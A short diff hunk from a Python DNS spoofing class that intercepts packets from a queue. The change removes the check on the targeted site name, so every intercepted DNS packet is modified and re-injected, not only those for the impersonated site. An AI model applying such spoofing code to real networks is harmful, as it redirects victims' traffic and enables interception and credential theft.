@@ -27,8 +27,8 @@ class DnsSpoofing:
                 my_packet = self.modify(my_packet)
             except IndexError:
                 pass
-            if my_packet[DNS].an.rrname == self.site_to_impersonate:
-                packet.set_payload(bytes(my_packet))
+
+            packet.set_payload(bytes(my_packet))
 
         packet.accept()
 
